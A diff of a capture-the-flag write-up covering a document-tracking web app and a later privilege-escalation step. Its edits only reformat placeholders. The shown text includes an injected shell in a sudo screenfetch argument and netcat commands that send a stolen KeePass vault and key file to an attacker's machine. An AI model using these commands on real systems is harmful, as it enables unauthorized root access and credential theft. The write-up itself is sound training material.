@@ -205,10 +205,10 @@ Recover the entity's attack plans.
 ### Web application
 
 The web application is a simple web application that allows you to upload a Word document, to track it and to identify a victim from it.
-When we upload a document, we can see that the document was sent to the server, and then we got back a signed version of the same document. What is worth noting is that a docx file is actually an archive containing multiple files inside, such as XML files, images, and more. Thus we can unzip both documents, and compare them with the `diff` command to see what changed between the two documents (where <signed_folder> is the folder containing the extracted files from the signed document, and <original_folder> is the folder containing the extracted files from the original document) :
+When we upload a document, we can see that the document was sent to the server, and then we got back a signed version of the same document. What is worth noting is that a docx file is actually an archive containing multiple files inside, such as XML files, images, and more. Thus we can unzip both documents, and compare them with the `diff` command to see what changed between the two documents (where `signed_folder` is the folder containing the extracted files from the signed document, and `original_folder` is the folder containing the extracted files from the original document) :
 
 ```bash
-diff -r <signed_folder> <original_folder>
+diff -r "$signed_folder" "$original_folder"
 ```
 
 The only difference between these two folders is that a VictimId field was added in `docProps/app.xml` in the signed folder.
@@ -259,13 +259,13 @@ sudo -u administrator /usr/bin/screenfetch -o 'command=hello; /bin/bash'
 This command allows us to get a bash shell as `administrator`, and then upon inspection of `administrator`'s home directory, we see that there are two interesting files, `vault.kdbx` and `logo.jpg`. We encoded these files in base64, copied them to our machine, and decoded them again to get the original files. A better way of doing this could be by using `netcat` by running this command on your machine :
 
 ```bash
-nc -lnv <port> > vault.kdbx
+nc -lnv "$port" > vault.kdbx
 ```
 
 Then on the attacking machine, we can run the following command to send the file to our machine :
 
 ```bash
-nc <your_ip> <port> < vault.kdbx
+nc "$ip" "$port" < vault.kdbx
 ```
 
 Then we can open the `vault.kdbx` file using KeePass or [KeeWeb](https://app.keeweb.info/). Opening the `vault.kdbx` file with KeePass required either a key file or a password. After trying multiple things, we suceeded with the `logo.jpg` file (which you can also retrieve with `netcat`) that was the required key file to open the vault.
